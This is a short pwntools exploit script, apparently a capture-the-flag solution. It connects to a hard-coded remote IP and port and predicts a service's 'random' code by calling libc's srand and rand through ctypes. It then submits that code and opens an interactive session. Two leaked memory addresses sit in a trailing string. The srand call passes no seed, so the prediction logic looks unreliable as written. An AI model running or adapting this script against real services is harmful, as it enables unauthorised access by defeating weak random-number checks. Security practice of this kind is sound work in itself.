from pwn import *
from ctypes import *

p = remote('123.57.248.214', 19751)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand()

# p.recvuntil(b'>')
# p.sendline(b'2')
# p.recvuntil(b':')
# p.sendline(b'\00' * 24)
p.recvuntil(b'>')
p.sendline(b'3')
p.recvuntil(b':')
code_ = "{:0>8}".format(libc.rand() % 100000000).encode()
print(code_)
p.sendline(code_)
p.interactive()

"""
0x7fffffffdb90
0x7ffff7c60770
"""
